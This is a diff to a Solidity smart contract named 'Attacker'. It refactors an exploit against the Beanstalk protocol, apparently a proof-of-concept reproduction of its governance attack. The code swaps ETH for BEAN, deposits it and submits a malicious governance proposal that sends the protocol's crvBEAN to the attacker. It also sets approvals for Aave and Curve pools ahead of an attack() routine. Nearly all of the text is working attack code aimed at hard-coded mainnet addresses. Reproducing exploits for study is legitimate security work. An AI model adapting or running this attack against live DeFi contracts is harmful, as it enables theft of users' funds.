@@ -11,7 +11,6 @@ contract Attacker {
     using SafeERC20 for ERC20;
 
     uint32 bip = 18;
-    address maliciousProposal = 0xE5eCF73603D98A0128F05ed30506ac7A663dBb69;
     address crvbean = 0x3a70DfA7d2262988064A2D051dd47521E43c9BdD;
     address beanStalk = 0xC1E088fC1323b20BCBee9bd1B9fC9546db5624C5;
 
@@ -25,37 +24,48 @@ contract Attacker {
     IUniswapV2Router02 uniswapRouter = IUniswapV2Router02(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
     ICurvePool threeCrvPool = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
 
-    function proposeBip() external payable {
-        address[] memory path = new address[](2);
-        path[0] = uniswapRouter.WETH();
-        path[1] = address(bean);
-        uniswapRouter.swapExactETHForTokens{ value: msg.value }(
-            0,
-            path,
-            address(this),
-            block.timestamp + 120
-        );
-        console.log(
-            "Initial USDC balancer of attacker: %s",
-            usdc.balanceOf(address(this))
-        );
+    // ========= BIP Creation Logic ========= //
 
+    function proposeBip() external payable {
+        swapEthForBean();
         console.log(
-            "After initial ETH -> BEAN swap, Bean balance of attacker: %s",
+            "After ETH -> BEAN swap, Bean balance of attacker: %s",
             bean.balanceOf(address(this)) / 1e6
         );
 
-        bean.safeApprove(beanStalk, type(uint256).max);
-        IBeanStalk(beanStalk).depositBeans(bean.balanceOf(address(this)));
+        depositAllBean();
         console.log(
             "After BEAN deposit to beanStalk, Bean balance of attacker: %s",
             bean.balanceOf(address(this)) / 1e6
         );
 
+        submitProposal();
+    }
+
+    function swapEthForBean() internal {
+        address[] memory path = new address[](2);
+        path[0] = uniswapRouter.WETH();
+        path[1] = address(bean);
+        uniswapRouter.swapExactETHForTokens{ value: 70 ether }(
+            0,
+            path,
+            address(this),
+            block.timestamp + 120
+        );
+    }
+
+    function depositAllBean() internal {
+        bean.safeApprove(beanStalk, type(uint256).max);
+        IBeanStalk(beanStalk).depositBeans(bean.balanceOf(address(this)));
+    }
+
+    function submitProposal() internal {
         IBeanStalk.FacetCut[] memory _diamondCut = new IBeanStalk.FacetCut[](0);
         bytes memory data = abi.encodeWithSelector(Attacker.getProposalProfit.selector);
         IBeanStalk(beanStalk).propose(_diamondCut, address(this), data, 3);
     }
+
+    // ========= Governance Attack Logic ========= //
 
     function attack() external {
         approveEverything();
@@ -74,7 +84,6 @@ contract Attacker {
         dai.safeApprove(address(aavelendingPool), type(uint256).max);
         usdc.safeApprove(address(aavelendingPool), type(uint256).max);
         usdt.safeApprove(address(aavelendingPool), type(uint256).max);
-        bean.safeApprove(address(aavelendingPool), type(uint256).max);
 
         dai.safeApprove(address(threeCrvPool), type(uint256).max);
         usdc.safeApprove(address(threeCrvPool), type(uint256).max);
@@ -190,9 +199,10 @@ contract Attacker {
     }
 
     function getProposalProfit() external {
-        ERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD).transfer(
+        address crvbeanToken = 0x3a70DfA7d2262988064A2D051dd47521E43c9BdD;
+        ERC20(crvbeanToken).transfer(
             msg.sender,
-            ERC20(0x3a70DfA7d2262988064A2D051dd47521E43c9BdD).balanceOf(address(this))
+            ERC20(crvbeanToken).balanceOf(address(this))
         );
     } 
 }
